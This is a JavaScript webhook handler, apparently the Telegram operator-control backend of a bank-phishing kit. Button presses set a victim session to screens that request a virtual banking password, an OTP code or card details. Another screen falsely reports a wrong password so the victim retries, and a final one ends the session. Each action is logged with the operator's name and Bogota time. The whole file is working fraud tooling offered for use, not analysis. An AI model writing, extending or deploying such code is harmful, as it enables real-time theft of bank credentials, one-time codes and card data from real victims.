import { setUserState } from '../lib/utils.js';

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const data = req.body;
        if (data && data.callback_query) {
            const query = data.callback_query;
            const callbackData = query.data || "";

            if (callbackData.startsWith("cmd|")) {
                const parts = callbackData.split("|");
                if (parts.length === 3) {
                    const action = parts[1];
                    const sessionKey = parts[2];

                    const statusMap = {
                        "clvs": "GO_TO_CLVS",
                        "otp": "GO_TO_OTP",
                        "tarjeta": "GO_TO_TARJETA",
                        "error": "ERROR_CLVS",
                        "fin": "GO_TO_FIN"
                    };
                    const newStatus = statusMap[action] || "WAITING";

                    await setUserState(sessionKey, newStatus);

                    const token = process.env.TELEGRAM_BOT_TOKEN;
                    const statusLabels = {
                        "clvs": "Pedir Clave Virtual",
                        "otp": "Pedir Código OTP",
                        "tarjeta": "Pedir Datos de Tarjeta",
                        "error": "Clave Incorrecta (Reintentar)",
                        "fin": "Finalizar Proceso"
                    };

                    const actionName = statusLabels[action] || action;
                    const fromUser = query.from;
                    const operatorName = fromUser ? [fromUser.first_name, fromUser.last_name].filter(Boolean).join(" ") + (fromUser.username ? ` (@${fromUser.username})` : '') : 'Operador';

                    // Quitar los botones del mensaje y agregar la nota de acción realizada con el operador
                    if (token && query.message) {
                        try {
                            const originalText = query.message.text || "";
                            const nowStr = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota', dateStyle: 'short', timeStyle: 'medium' });
                            const updatedText = originalText + `\n\n✅ <b>ACCIÓN EJECUTADA:</b>\n• <b>Acción:</b> ${actionName}\n• <b>Operador:</b> <code>${operatorName}</code>\n• <b>Hora:</b> ${nowStr}`;

                            await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: query.message.chat.id,
                                    message_id: query.message.message_id,
                                    text: updatedText,
                                    parse_mode: 'HTML',
                                    reply_markup: { inline_keyboard: [] } // Quita los botones
                                })
                            });
                        } catch (errEdit) {
                            console.error("Error al actualizar mensaje tras clic:", errEdit);
                        }
                    }

                    if (token && token !== "YOUR_BOT_TOKEN_HERE") {
                        await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                callback_query_id: query.id,
                                text: `Acción ejecutada por ${operatorName}: ${actionName}`
                            })
                        });
                    }
                }
            }
        }
    } catch (e) {
        console.error(e);
    }
    
    res.status(200).json({ status: "ok" });
}
